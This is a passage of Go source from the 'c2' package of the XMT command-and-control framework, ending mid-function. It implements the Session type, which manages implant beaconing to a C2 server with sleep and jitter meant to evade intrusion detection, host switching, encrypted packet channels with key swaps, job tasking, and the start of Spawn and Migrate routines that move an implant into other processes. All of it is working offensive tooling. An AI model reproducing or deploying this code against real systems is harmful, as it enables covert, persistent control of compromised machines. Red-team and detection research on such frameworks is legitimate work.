package c2

import (
	"context"
	"errors"
	"io"
	"net"
	"strconv"
	"sync"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/c2/cout"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/device/local"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/bugtrack"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	sleepMod  = 5
	maxErrors = 5

	spawnDefaultTime = time.Second * 10
)

var (
	// ErrNoTask is returned from some functions that return Jobs. This will
	// be returned when the Job object will be nil due to the fact the function
	// was called on the client-side instead of the server-side.
	//
	// This is more of an informational message than an error, as this does NOT
	// indicate that the function failed, but that the Job object should NOT be
	// used as it is nil. (In case the Job object is not checked.)
	ErrNoTask = xerr.Sub("no Job created for client Session", 0x1D)
	// ErrFullBuffer is returned from the WritePacket function when the send
	// buffer for the Session is full.
	//
	// This error also indicates that a call to 'Send' would block.
	ErrFullBuffer = xerr.Sub("send buffer is full", 0x1E)
	// ErrInvalidPacketCount is returned when attempting to read a packet marked
	// as multi or frag an the total count returned is zero.
	ErrInvalidPacketCount = xerr.Sub("frag/multi total is zero on a frag/multi packet", 0x1F)
)

// Session is a struct that represents a connection between the client and the
// Listener.
//
// This struct does some automatic handeling and acts as the communication
// channel between the client and server.
type Session struct {
	lock   sync.RWMutex
	keyNew *data.Key

	Last    time.Time
	Created time.Time
	connection

	swap            Profile
	ch, wake        chan struct{}
	parent          *Listener
	send, recv, chn chan *com.Packet
	frags           map[uint16]*cluster
	jobs            map[uint16]*Job

	Shutdown func(*Session)
	Receive  func(*Session, *com.Packet)
	proxy    *proxyBase
	tick     *time.Ticker
	peek     *com.Packet
	host     container
	proxyState

	Device device.Machine
	sleep  time.Duration
	state  state
	key    data.Key

	ID             device.ID
	jitter, errors uint8
}

// Wait will block until the current Session is closed and shutdown.
func (s *Session) Wait() {
	<-s.ch
}
func (s *Session) wait() {
	if s.sleep < 1 || s.state.Closing() {
		return
	}
	// NOTE(dij): Should we add a "work hours" feature here? (Think how Empire
	//            has). Would be an /interesting/ implementation.
	w := s.sleep
	if s.jitter > 0 && s.jitter < 101 {
		if (s.jitter == 100 || uint8(util.FastRandN(100)) < s.jitter) && w > time.Millisecond {
			d := util.Rand.Int63n(int64(w / time.Millisecond))
			if util.FastRandN(2) == 1 {
				d = d * -1
			}
			if w += (time.Duration(d) * time.Millisecond); w < 0 {
				w = time.Duration(w * -1)
			}
			if w == 0 {
				w = s.sleep
			}
		}
	}
	if s.tick == nil {
		s.tick = time.NewTicker(w)
	} else {
		for len(s.tick.C) > 0 { // Drain the ticker.
			<-s.tick.C
		}
		s.tick.Reset(w)
	}
	if cout.Enabled {
		s.log.Trace("[%s] Sleeping for %s.", s.ID, w)
	}
	select {
	case <-s.wake:
		break
	case <-s.tick.C:
		break
	case <-s.ctx.Done():
		s.state.Set(stateClosing)
		break
	}
}

// Wake will interrupt the sleep of the current Session thread. This will
// trigger the send and receive functions of this Session.
//
// This is not valid for Server side Sessions.
func (s *Session) Wake() {
	if s.wake == nil || s.s != nil || s.state.WakeClosed() {
		return
	}
	select {
	case s.wake <- wake:
	default:
	}
}
func (s *Session) listen() {
	if _ = s.proxyState; s.s != nil {
		// NOTE(dij): Server side sessions shouldn't be running this, bail.
		return
	}
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Session.listen()")
	}
	var e bool
	for s.wait(); ; s.wait() {
		if cout.Enabled {
			s.log.Debug("[%s] Waking up..", s.ID)
		}
		if s.state.Closing() {
			if s.state.Moving() {
				if cout.Enabled {
					s.log.Info("[%s] Session is being migrated, closing down our threads!", s.ID)
				}
				break
			}
			if cout.Enabled {
				s.log.Info("[%s] Shutdown indicated, queuing final Shutdown Packet.", s.ID)
			}
			// NOTE(dij): This action disregards the packet that might be
			//            in the peek queue. Not sure if we should worry about
			//            this one tbh.
			s.peek = &com.Packet{ID: SvShutdown, Device: s.ID}
			s.state.Set(stateShutdown)
			s.state.Unset(stateChannelValue)
			s.state.Unset(stateChannelUpdated)
			s.state.Unset(stateChannel)
		}
		if s.host.Unwrap(); s.swap != nil {
			if s.p, s.swap = s.swap, nil; cout.Enabled {
				s.log.Info("[%s] Performing a Profile swap!", s.ID)
			}
			var h string
			if h, s.w, s.t = s.p.Next(); len(h) > 0 {
				s.host.Set(h)
			}
			if d := s.p.Sleep(); d > 0 {
				s.sleep = d
			}
			if j := s.p.Jitter(); j >= 0 && j <= 100 {
				s.jitter = uint8(j)
			}
		}
		if s.p.Switch(e) {
			var h string
			h, s.w, s.t = s.p.Next()
			s.host.Set(h)
			// NOTE(dij): Actually, let's decrement it, as a random or round
			//            robin profile would leave us here forever!
			s.errors--
		}
		c, err := s.p.Connect(s.ctx, s.host.String())
		s.host.Wrap()
		if e = false; err != nil {
			if s.state.Closing() {
				break
			}
			if cout.Enabled {
				s.log.Warning("[%s] Error attempting to connect to %q: %s!", s.ID, s.host, err)
			}
			if e = true; s.errors <= maxErrors {
				s.errors++
				continue
			}
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if cout.Enabled {
			s.log.Debug("[%s] Connected to %q..", s.ID, s.host)
		}
		if e = !s.session(c); e {
			s.errors++
		} else {
			s.errors = 0
		}
		if c.Close(); s.errors > maxErrors {
			if cout.Enabled {
				s.log.Error("[%s] Too many errors, closing Session!", s.ID)
			}
			break
		}
		if s.state.Shutdown() {
			break
		}
	}
	if cout.Enabled {
		s.log.Trace("[%s] Stopping transaction thread..", s.ID)
	}
	s.shutdown()
}
func (s *Session) shutdown() {
	if s.Shutdown != nil && !s.state.Moving() {
		s.m.queue(event{s: s, sf: s.Shutdown})
	}
	if s.proxy != nil {
		s.proxy.Close()
	}
	if s.lock.Lock(); !s.state.SendClosed() {
		s.state.Set(stateSendClose)
		close(s.send)
	}
	if s.wake != nil && !s.state.WakeClosed() {
		s.state.Set(stateWakeClose)
		close(s.wake)
	}
	if s.recv != nil && !s.state.CanRecv() && !s.state.RecvClosed() {
		s.state.Set(stateRecvClose)
		close(s.recv)
	}
	if s.tick != nil {
		s.tick.Stop()
	}
	if s.state.Set(stateClosed); s.s != nil {
		s.s.Remove(s.ID, false)
	}
	s.m.close()
	if s.lock.Unlock(); s.isMoving() {
		return
	}
	close(s.ch)
}

// Jobs returns all current Jobs for this Session.
//
// This returns nil if there are no Jobs or this Session does not have the
// ability to schedule them.
func (s *Session) Jobs() []*Job {
	if s.jobs == nil || len(s.jobs) == 0 {
		return nil
	}
	s.lock.RLock()
	r := make([]*Job, 0, len(s.jobs))
	for _, j := range s.jobs {
		r = append(r, j)
	}
	s.lock.RUnlock()
	return r
}

// Close stops the listening thread from this Session and releases all
// associated resources.
//
// This function blocks until the running threads close completely.
func (s *Session) Close() error {
	return s.close(true)
}

// Jitter returns the Jitter percentage value. Values of zero (0) indicate that
// Jitter is disabled.
func (s *Session) Jitter() uint8 {
	return s.jitter
}

// IsProxy returns true when a Proxy has been attached to this Session and is
// active.
func (s *Session) IsProxy() bool {
	return !s.state.Closing() && s.proxy != nil && s.proxy.IsActive()
}

// IsActive returns true if this Session is still able to send and receive
// Packets.
func (s *Session) IsActive() bool {
	return !s.state.Closing()
}
func (s *Session) isMoving() bool {
	return s.parent == nil && s.state.Moving()
}

// IsClient returns true when this Session is not associated to a Listener on
// this end, which signifies that this session is Client initiated or we are
// on a client device.
func (s *Session) IsClient() bool {
	return s.parent == nil
}

// IsClosed returns true if the Session is considered "Closed" and cannot
// send/receive Packets.
func (s *Session) IsClosed() bool {
	return s.state.Closed()
}

// InChannel will return true is this Session sets the Channel flag on any
// Packets that flow through this Session, including Proxied clients or if this
// Session is currently in Channel mode, even if not explicitly set.
func (s *Session) InChannel() bool {
	return s.state.Channel() || s.state.ChannelValue()
}
func (s *Session) accept(i uint16) {
	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
		return
	}
	s.lock.RLock()
	j, ok := s.jobs[i]
	if s.lock.RUnlock(); !ok {
		return
	}
	if j.Status = StatusAccepted; j.Update != nil {
		s.m.queue(event{j: j, jf: j.Update})
	}
	if cout.Enabled {
		s.log.Trace("[%s] Set JobID %d to accepted.", s.ID, i)
	}
}
func (s *Session) newJobID() uint16 {
	var (
		ok   bool
		i, c uint16
	)
	s.lock.RLock()
	for ; c < 512; c++ {
		i = uint16(util.FastRand())
		if _, ok = s.jobs[i]; !ok && i > 1 {
			s.lock.RUnlock()
			return i
		}
	}
	s.lock.RUnlock()
	return 0
}

// Read attempts to grab a Packet from the receiving buffer.
//
// This function returns nil if the buffer is empty.
func (s *Session) Read() *com.Packet {
	if s.recv == nil || !s.state.CanRecv() {
		return nil
	}
	if len(s.recv) > 0 {
		return <-s.recv
	}
	return nil
}

// SetChannel will disable setting the Channel mode of this Session.
//
// If true, every Packet sent will trigger Channel mode. This setting does NOT
// affect the Session enabling Channel mode if a Packet is sent with the Channel
// Flag enabled.
//
// Changes to this setting will call the 'Wake' function.
func (s *Session) SetChannel(c bool) {
	if s.state.Closing() || s.isMoving() || !s.state.SetChannel(c) {
		return
	}
	if c {
		s.queue(&com.Packet{Flags: com.FlagChannel, Device: s.ID})
	} else {
		s.queue(&com.Packet{Flags: com.FlagChannelEnd, Device: s.ID})
	}
	if !s.state.Channel() && s.parent == nil && s.wake != nil && len(s.wake) < cap(s.wake) {
		s.wake <- wake
	}
}

// Job returns a Job with the associated ID, if it exists. It returns nil
// otherwise.
func (s *Session) Job(i uint16) *Job {
	if i < 2 || s.jobs == nil || len(s.jobs) == 0 {
		return nil
	}
	s.lock.RLock()
	j := s.jobs[i]
	s.lock.RUnlock()
	return j
}

// RemoteAddr returns a string representation of the remotely connected IP
// address.
//
// This could be the IP address of the c2 server or the public IP of the client.
func (s *Session) RemoteAddr() string {
	return s.host.String()
}

// Send adds the supplied Packet into the stack to be sent to the server on next
// wake. This call is asynchronous and returns immediately.
//
// Unlike 'Write' this function does NOT return an error and will wait if the
// send buffer is full.
func (s *Session) Send(p *com.Packet) {
	s.write(true, p)
}
func (s *Session) close(w bool) error {
	if s.state.Closing() {
		return nil
	}
	if s.s != nil && !s.state.ShutdownWait() {
		s.peek = &com.Packet{ID: SvShutdown, Device: s.ID}
		if !s.state.SendClosed() {
			for len(s.send) > 0 {
				<-s.send // Clear the send queue.
			}
		}
		s.state.Unset(stateChannelValue)
		s.state.Unset(stateChannelUpdated)
		s.state.Unset(stateChannel)
		return nil
	}
	s.state.Unset(stateChannelValue)
	s.state.Unset(stateChannelUpdated)
	s.state.Unset(stateChannel)
	if s.state.Set(stateClosing); s.s != nil {
		s.shutdown()
		return nil
	}
	if s.Wake(); w {
		<-s.ch
	}
	return nil
}
func (s *Session) queue(n *com.Packet) {
	if s.state.SendClosed() {
		return
	}
	if n.Device.Empty() {
		if n.Device = local.UUID; bugtrack.Enabled {
			bugtrack.Track("c2.Session.queue(): Found an empty ID value during Packet n=%s queue!", n)
		}
	}
	if cout.Enabled {
		s.log.Trace("[%s] Adding Packet %q to queue.", s.ID, n)
	}
	if s.chn != nil {
		select {
		case s.chn <- n:
		default:
			if cout.Enabled {
				s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
			}
		}
		return
	}
	select {
	case s.send <- n:
	default:
		if cout.Enabled {
			s.log.Warning("[%s] Packet %q was dropped during a call to queue! (Maybe increase the chan size?)", s.ID, n)
		}
	}
}

// Time returns the value for the timeout period between C2 Server connections.
func (s *Session) Time() time.Duration {
	return s.sleep
}

// Listener will return the Listener that created the Session. This will return
// nil if the session is not on the server side.
func (s *Session) Listener() *Listener {
	return s.parent
}

// Done returns a channel that's closed when this Session is closed.
//
// This can be used to monitor a Session's status using a select statement.
func (s *Session) Done() <-chan struct{} {
	return s.ch
}
func (s *Session) channelRead(x net.Conn) {
	if bugtrack.Enabled {
		defer bugtrack.Recover("c2.Session.channelRead()")
	}
	if cout.Enabled {
		s.log.Info("[%s:C->S:R] %s: Started Channel writer.", s.ID, s.host)
	}
	for x.SetReadDeadline(empty); s.state.Channel(); x.SetReadDeadline(empty) {
		n, err := readPacket(x, s.w, s.t)
		if err != nil {
			if cout.Enabled {
				s.log.Error("[%s:C->S:R] %s: Error reading next wire Packet: %s!", s.ID, s.host, err)
			}
			break
		}
		// KeyCrypt: Decrypt incoming Packet here to be read.
		if n.Crypt(&s.key); cout.Enabled {
			s.log.Debug("[%s:C->S:R] %s: Received a Packet %q.", s.ID, s.host, n)
		}
		if err = receive(s, s.parent, n); err != nil {
			if cout.Enabled {
				s.log.Warning("[%s:C->S:R] %s: Error processing Packet data: %s!", s.ID, s.host, err)
			}
			break
		}
		if s.Last = time.Now(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
			if cout.Enabled {
				s.log.Info("[%s:C->S:R] Session/Packet indicated channel close!", s.ID)
			}
			break
		}
	}
	if x.SetDeadline(time.Now().Add(-time.Second)); cout.Enabled {
		s.log.Debug("[%s:C->S:R] Closed Channel reader.", s.ID)
	}
}
func (s *Session) channelWrite(x net.Conn) {
	if cout.Enabled {
		s.log.Info("[%s:C->S:W] %s: Started Channel writer.", s.ID, s.host)
	}
	for x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)); s.state.Channel(); x.SetWriteDeadline(time.Now().Add(s.sleep * sleepMod)) {
		n := s.next(false)
		if n == nil {
			if cout.Enabled {
				s.log.Info("[%s:C->S:W] Session indicated channel close!", s.ID)
			}
			break
		}
		if s.state.ChannelCanStop() {
			n.Flags |= com.FlagChannelEnd
		}
		// KeyCrypt: Encrpt new Packet here to be sent.
		if n.Crypt(&s.key); cout.Enabled {
			s.log.Debug("[%s:C->S:W] %s: Sending Packet %q.", s.ID, s.host, n)
		}
		// KeyCrypt: "next" was called, check for a Key Swap.
		s.keyCheck()
		if err := writePacket(x, s.w, s.t, n); err != nil {
			if n.Clear(); cout.Enabled {
				if errors.Is(err, net.ErrClosed) {
					s.log.Info("[%s:C->S:W] %s: Write channel socket closed.", s.ID, s.host)
				} else {
					s.log.Error("[%s:C->S:W] %s: Error attempting to write Packet: %s!", s.ID, s.host, err)
				}
			}
			break
		}
		if n.Clear(); n.Flags&com.FlagChannelEnd != 0 || s.state.ChannelCanStop() {
			if cout.Enabled {
				s.log.Info("[%s:C->S:W] Session/Packet indicated channel close!", s.ID)
			}
			break
		}
	}
	if x.Close(); cout.Enabled {
		s.log.Info("[%s:S->C:W] Closed Channel writer.", s.ID)
	}
}
func (s *Session) session(c net.Conn) bool {
	n := s.next(false)
	if s.state.Unset(stateChannel); s.state.ChannelCanStart() {
		if n.Flags |= com.FlagChannel; cout.Enabled {
			s.log.Trace("[%s] %s: Setting Channel flag on next Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	} else if n.Flags&com.FlagChannel != 0 {
		if cout.Enabled {
			s.log.Trace("[%s] %s: Channel was set by next incoming Packet!", s.ID, s.host)
		}
		s.state.Set(stateChannel)
	}
	// KeyCrypt: Encrpt new Packet here to be sent.
	if n.Crypt(&s.key); cout.Enabled {
		s.log.Debug("[%s] %s: Sending Packet %q.", s.ID, s.host, n)
	}
	// KeyCrypt: "next" was called, check for a Key Swap.
	s.keyCheck()
	err := writePacket(c, s.w, s.t, n)
	if n.Clear(); err != nil {
		if cout.Enabled {
			s.log.Error("[%s] %s: Error attempting to write Packet: %s!", s.ID, s.host, err)
		}
		return false
	}
	if n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		s.state.Set(stateChannel)
	}
	n = nil
	if n, err = readPacket(c, s.w, s.t); err != nil {
		if cout.Enabled {
			s.log.Error("[%s] %s: Error attempting to read Packet: %s!", s.ID, s.host, err)
		}
		return false
	}
	// KeyCrypt: Decrypt incoming Packet here to be read.
	if n.Crypt(&s.key); n.Flags&com.FlagChannel != 0 && !s.state.Channel() {
		if s.state.Set(stateChannel); cout.Enabled {
			s.log.Trace("[%s] %s: Enabling Channel as received Packet has a Channel flag!", s.ID, s.host)
		}
	}
	if cout.Enabled {
		s.log.Debug("[%s] %s: Received a Packet %q..", s.ID, s.host, n)
	}
	if err = receive(s, s.parent, n); err != nil {
		if cout.Enabled {
			s.log.Warning("[%s] %s: Error processing packet data: %s!", s.ID, s.host, err)
		}
		return false
	}
	if !s.state.Channel() {
		return true
	}
	go s.channelRead(c)
	s.channelWrite(c)
	c.SetDeadline(time.Now().Add(-time.Second))
	s.state.Unset(stateChannel)
	return true
}
func (s *Session) pick(i bool) *com.Packet {
	if s.peek != nil {
		n := s.peek
		s.peek = nil
		return n
	}
	if len(s.send) > 0 {
		return <-s.send
	}
	switch {
	case s.s != nil && s.state.Channel():
		select {
		case <-s.wake:
			return nil
		case n := <-s.send:
			return n
		}
	case !i && s.parent == nil && s.state.Channel():
		var o uint32
		go func() {
			if bugtrack.Enabled {
				defer bugtrack.Recover("c2.Session.pick.func1()")
			}
			if s.wait(); atomic.LoadUint32(&o) == 0 {
				if s.doNextKeySwap() {
					n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
					n.Write((*s.keyNew)[:])
					s.send <- n
				} else {
					s.send <- &com.Packet{Device: s.ID}
				}
			}
		}()
		n := <-s.send
		atomic.StoreUint32(&o, 1)
		return n
	case i:
		return nil
	}
	if s.doNextKeySwap() {
		n := &com.Packet{Device: s.ID, Flags: com.FlagCrypt}
		n.Write((*s.keyNew)[:])
		return n
	}
	return &com.Packet{Device: s.ID}
}
func (s *Session) next(i bool) *com.Packet {
	n := s.pick(i)
	if n == nil {
		return nil
	}
	if s.proxy != nil && s.proxy.IsActive() {
		n.Tags = s.proxy.tags()
	}
	if len(s.send) == 0 && verifyPacket(n, s.ID) {
		s.accept(n.Job)
		s.state.SetLast(0)
		return n
	}
	t := n.Tags
	if l := s.state.Last(); l > 0 {
		for n.Flags.Group() == l && len(s.send) > 0 {
			n = <-s.send
		}
		if s.state.SetLast(0); n == nil || n.Flags.Group() == l {
			return &com.Packet{Device: s.ID, Tags: t}
		}
	}
	n, s.peek = nextPacket(s, s.send, n, s.ID, t)
	n.Tags = mergeTags(n.Tags, t)
	return n
}

// Write adds the supplied Packet into the stack to be sent to the server on the
// next wake. This call is asynchronous and returns immediately.
//
// 'ErrFullBuffer' will be returned if the send buffer is full.
func (s *Session) Write(p *com.Packet) error {
	return s.write(false, p)
}
func (s *Session) handle(p *com.Packet) bool {
	if p == nil || p.Device.Empty() || (p.ID != RvResult && p.ID != RvMigrate) || p.Job < 2 {
		return false
	}
	if s.jobs == nil || len(s.jobs) == 0 {
		if cout.Enabled {
			s.log.Warning("[%s/ShC] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return false
	}
	if s.state.Moving() {
		if cout.Enabled {
			s.log.Warning("[%s/ShC] Dropping Job ID %d as Session is being Migrated!", s.ID, p.Job)
		}
		return true
	}
	s.lock.RLock()
	j, ok := s.jobs[p.Job]
	if s.lock.RUnlock(); !ok {
		if cout.Enabled {
			s.log.Warning("[%s:/ShC] Received an un-tracked Job ID %d!", s.ID, p.Job)
		}
		return false
	}
	if cout.Enabled {
		s.log.Info("[%s/ShC] Received response for Job ID %d.", s.ID, j.ID)
	}
	if j.Result, j.Complete, j.Status = p, time.Now(), StatusCompleted; p.Flags&com.FlagError != 0 {
		j.Status = StatusError
		if err := p.ReadString(&j.Error); err != nil {
			j.Error = err.Error()
		}
	}
	s.lock.Lock()
	delete(s.jobs, j.ID)
	s.lock.Unlock()
	if j.cancel(); j.Update != nil {
		s.m.queue(event{j: j, jf: j.Update})
	}
	return true
}
func (s *Session) frag(i, id, max, cur uint16) {
	if i < 2 || s.parent == nil || s.jobs == nil || len(s.jobs) == 0 {
		return
	}
	s.lock.RLock()
	j, ok := s.jobs[i]
	if s.lock.RUnlock(); !ok {
		return
	}
	if j.Frags == 0 {
		j.Status = StatusReceiving
	}
	if j.Frags, j.Current = max, cur; j.Update != nil {
		s.m.queue(event{j: j, jf: j.Update})
	}
	if cout.Enabled {
		s.log.Trace("[%s/Frag] Tracking Job %d Frag Group %X, Current %d of %d.", s.ID, i, id, cur+1, max)
	}
}

// Packets will create and setup the Packet receiver channel. This function will
// then return the read-only Packet channel for use.
//
// This function is safe to use multiple times as it will return the same chan
// if it already exists.
func (s *Session) Packets() <-chan *com.Packet {
	if s.recv != nil && s.state.CanRecv() {
		return s.recv
	}
	if s.isMoving() {
		return nil
	}
	s.lock.Lock()
	s.recv = make(chan *com.Packet, 256)
	if s.state.Set(stateCanRecv); cout.Enabled {
		s.log.Info("[%s] Enabling Packet receive channel.", s.ID)
	}
	s.lock.Unlock()
	return s.recv
}

// SetJitter sets Jitter percentage of the Session's wake interval. This is a 0
// to 100 percentage (inclusive) that will determine any +/- time is added to
// the waiting period. This assists in evading IDS/NDS devices/systems.
//
// A value of 0 will disable Jitter and any value over 100 will set the value to
// 100, which represents using Jitter 100% of the time.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet.
func (s *Session) SetJitter(j int) (*Job, error) {
	return s.SetDuration(s.sleep, j)
}

// Task is a function that will attach a JobID to the specified Packet (if
// empty) and wil return a Job promise that can be used to internally keep track
// of a response Packet with a matching Job ID.
//
// Errors will be returned if Task is attempted on an invalid Packet, this
// Session is a client-side Session, Job ID is already used or the scheduler is
// full.
func (s *Session) Task(n *com.Packet) (*Job, error) {
	if n == nil {
		return nil, xerr.Sub("empty or nil Job", 0x20)
	}
	if s.parent == nil || s.jobs == nil {
		return nil, xerr.Sub("cannot be a client session", 0x21)
	}
	if s.isMoving() {
		return nil, xerr.Sub("migration in progress", 0x22)
	}
	if n.Job == 0 {
		if n.Job = s.newJobID(); n.Job == 0 {
			return nil, xerr.Sub("cannot assign a Job ID", 0x23)
		}
	}
	if n.Device.Empty() {
		n.Device = s.Device.ID
	}
	s.lock.RLock()
	_, ok := s.jobs[n.Job]
	if s.lock.RUnlock(); ok {
		if xerr.Concat {
			return nil, xerr.Sub("job ID "+strconv.Itoa(int(n.Job))+" is in use", 0x24)
		}
		return nil, xerr.Sub("job ID is in use", 0x24)
	}
	if err := s.write(false, n); err != nil {
		return nil, err
	}
	j := &Job{ID: n.Job, Type: n.ID, Start: time.Now(), Session: s}
	j.ctx, j.cancel = context.WithCancel(s.ctx)
	s.lock.Lock()
	s.jobs[n.Job] = j
	if s.lock.Unlock(); cout.Enabled {
		s.log.Info("[%s/ShC] Added JobID %d to Track!", s.ID, n.Job)
	}
	return j, nil
}
func (s *Session) write(w bool, n *com.Packet) error {
	if s.state.Closing() || s.state.SendClosed() {
		return io.ErrClosedPipe
	}
	if limits.Frag <= 0 || n.Size() <= limits.Frag {
		if !w {
			switch {
			case s.chn != nil && len(s.chn)+1 >= cap(s.chn):
				fallthrough
			case len(s.send)+1 >= cap(s.send):
				return ErrFullBuffer
			}
		}
		if s.queue(n); s.state.Channel() {
			s.Wake()
		}
		return nil
	}
	m := (n.Size() / limits.Frag)
	if (m+1)*limits.Frag < n.Size() {
		m++
	}
	if !w && len(s.send)+m >= cap(s.send) {
		return ErrFullBuffer
	}
	var (
		x    = int64(n.Size())
		g    = uint16(util.FastRand())
		err  error
		t, v int64
	)
	m++
	for i := 0; i < m && t < x; i++ {
		c := &com.Packet{ID: n.ID, Job: n.Job, Flags: n.Flags, Chunk: data.Chunk{Limit: limits.Frag}}
		c.Flags.SetGroup(g)
		c.Flags.SetLen(uint16(m))
		c.Flags.SetPosition(uint16(i))
		if v, err = n.WriteTo(c); err != nil && err != data.ErrLimit {
			c.Flags.SetLen(0)
			c.Flags.SetPosition(0)
			c.Flags.Set(com.FlagError)
			c.Reset()
			c.WriteUint8(0)
		}
		t += v
		if s.queue(c); s.state.Channel() {
			s.Wake()
		}
	}
	n.Clear()
	return err
}
func (s *Session) setProfile(b []byte) (*Job, error) {
	if s.parent == nil {
		return nil, ErrNoTask
	}
	n := &com.Packet{ID: task.MvProfile, Device: s.Device.ID}
	n.WriteBytes(b)
	return s.Task(n)
}

// SetProfile will set the Profile used by this Session. This function will
// ensure that the profile is marshalable before setting and will then pass it
// to be set by the client Session (if this isn't one already).
//
// If this is a server-side Session, this will trigger the sending of a MvProfile
// Packet to update the client-side instance, which will update on it's next
// wakeup cycle.
//
// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
// setting the Profile and indicates that no Packet will be sent and that the
// Job object result is nil.
func (s *Session) SetProfile(p Profile) (*Job, error) {
	if p == nil {
		return nil, ErrInvalidProfile
	}
	m, ok := p.(marshaler)
	if !ok {
		return nil, xerr.Sub("cannot marshal Profile", 0x25)
	}
	b, err := m.MarshalBinary()
	if err != nil {
		return nil, xerr.Wrap("cannot marshal Profile", err)
	}
	s.p = p
	return s.setProfile(b)
}

// Tasklet is a function similar to Task and will attach a JobID to the specified
// Packet created by the supplied Tasklet and wil return a Job promise that can be
// used to internally keep track of a response Packet with a matching Job ID.
//
// If the Tasklet has an issue generating the payload, it will return an error
// before scheduling.
//
// Errors will be returned if Task is attempted on an invalid Packet, this Session
// is a client-side Session, Job ID is already or the scheduler is full.
func (s *Session) Tasklet(t task.Tasklet) (*Job, error) {
	if t == nil {
		return nil, xerr.Sub("empty or nil Tasklet", 0x26)
	}
	n, err := t.Packet()
	if err != nil {
		return nil, err
	}
	return s.Task(n)
}

// SetSleep sets the wake interval period for this Session. This is the time value
// between connections to the C2 Server.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet. This setting does not affect Jitter.
func (s *Session) SetSleep(t time.Duration) (*Job, error) {
	return s.SetDuration(t, int(s.jitter))
}

// SetProfileBytes will set the Profile used by this Session. This function will
// unmarshal and set the server-side before setting and will then pass it to be
// set by the client Session (if this isn't one already).
//
// If this is a server-side Session, this will trigger the sending of a MvProfile
// Packet to update the client-side instance, which will update on it's next
// wakeup cycle.
//
// This function will fail if no ProfileParser is set.
//
// If this is a client-side session the error 'ErrNoTask' will be returned AFTER
// setting the Profile and indicates that no Packet will be sent and that the
// Job object result is nil.
func (s *Session) SetProfileBytes(b []byte) (*Job, error) {
	if ProfileParser == nil {
		return nil, xerr.Sub("no Profile parser loaded", 0x15)
	}
	p, err := ProfileParser(b)
	if err != nil {
		return nil, xerr.Wrap("parse Profile", err)
	}
	s.p = p
	return s.setProfile(b)
}

// Spawn will execute the provided runnable and will wait up to the provided
// duration to transfer profile and Session information to the new runnable
// using a Pipe connection with the name provided. Once complete, and additional
// copy of this Session (with a different ID) will exist.
//
// This function uses the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during the Spawn.
func (s *Session) Spawn(n string, r runnable) (uint32, error) {
	return s.SpawnProfile(n, nil, 0, r)
}

// SetDuration sets the wake interval period and Jitter for this Session. This is
// the time value between connections to the C2 Server.
//
// Jitter is a 0 to 100 percentage (inclusive) that will determine any +/- time
// is added to the waiting period. This assists in evading IDS/NDS devices/systems.
//
// A value of 0 will disable Jitter and any value over 100 will set the value to
// 100, which represents using Jitter 100% of the time.
//
// If this is a Server-side Session, the new value will be sent to the Client in
// a MvTime Packet.
func (s *Session) SetDuration(t time.Duration, j int) (*Job, error) {
	switch {
	case j < 0:
		s.jitter = 0
	case j > 100:
		s.jitter = 100
	default:
		s.jitter = uint8(j)
	}
	// NOTE(dij): This may cause a de-sync issue when combined with a smaller
	//            initial timeout only on channels.
	//            (Just the bail below)
	if s.sleep = t; s.parent == nil {
		return nil, ErrNoTask
	}
	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
	n.WriteUint8(s.jitter)
	n.WriteUint64(uint64(s.sleep))
	return s.Task(n)
}

// Migrate will execute the provided runnable and will wait up to 60 seconds
// (can be changed using 'MigrateProfile') to transfer execution control to the
// new runnable using a Pipe connection with the name provided.
//
// This function uses the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// If 'wait' is true, this will wait for all events to complete before starting
// the Migration process.
//
// The provided JobID will be used to indicate to the server that the associated
// Migration Task was completed, as the new client will sent a 'RvMigrate' with
// the associated JobID once Migration has completed successfully.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during Migration.
func (s *Session) Migrate(wait bool, n string, job uint16, r runnable) (uint32, error) {
	return s.MigrateProfile(wait, n, nil, job, 0, r)
}

// SpawnProfile will execute the provided runnable and will wait up to the
// provided duration to transfer profile and Session information to the new runnable
// using a Pipe connection with the name provided. Once complete, and additional
// copy of this Session (with a different ID) will exist.
//
// This function uses the provided profile bytes unless the byte slice is empty,
// then this will use the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during the Spawn.
func (s *Session) SpawnProfile(n string, b []byte, t time.Duration, e runnable) (uint32, error) {
	if s.s != nil {
		return 0, xerr.Sub("must be a client session", 0x21)
	}
	if s.isMoving() {
		return 0, xerr.Sub("migration in progress", 0x22)
	}
	if len(n) == 0 {
		return 0, xerr.Sub("empty or invalid loader name", 0x14)
	}
	var err error
	if len(b) == 0 {
		// ^ Use our own Profile if one is not provided.
		p, ok := s.p.(marshaler)
		if !ok {
			return 0, xerr.Sub("cannot marshal Profile", 0x25)
		}
		if b, err = p.MarshalBinary(); err != nil {
			return 0, xerr.Wrap("cannot marshal Profile", err)
		}
	}
	if t <= 0 {
		t = spawnDefaultTime
	}
	if cout.Enabled {
		s.log.Info("[%s/SpN] Starting Spawn process!", s.ID)
	}
